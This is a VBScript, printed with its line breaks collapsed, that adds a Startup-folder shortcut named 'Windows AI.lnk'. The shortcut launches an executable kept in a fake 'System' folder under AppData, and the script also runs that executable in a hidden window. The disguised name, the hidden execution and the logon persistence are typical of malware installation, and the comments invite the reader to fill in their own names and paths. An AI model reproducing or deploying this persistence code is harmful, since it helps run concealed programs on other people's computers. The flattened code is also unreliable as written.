' Create a FileSystemObjectSet objFSO = CreateObject("Scripting.FileSystemObject")' Get the user's profile directorySet objShell = CreateObject("WScript.Shell")userProfileDir = objShell.ExpandEnvironmentStrings("%USERPROFILE%")' Create a shortcut in the Startup folder to run an EXE filestartupFolder = objShell.SpecialFolders("Startup")shortcutPath = startupFolder & "\Windows AI.lnk"  ' Change "Windows AI.lnk" to your desired shortcut nameSet objShellLink = objShell.CreateShortcut(shortcutPath)exeFilePath = userProfileDir & "\AppData\System\BN.exe"  ' Specify the path to your EXE fileobjShellLink.TargetPath = exeFilePathobjShellLink.WindowStyle = 7  ' Minimized windowobjShellLink.Save' Run the EXE fileobjShell.Run """" & exeFilePath & """", 0, True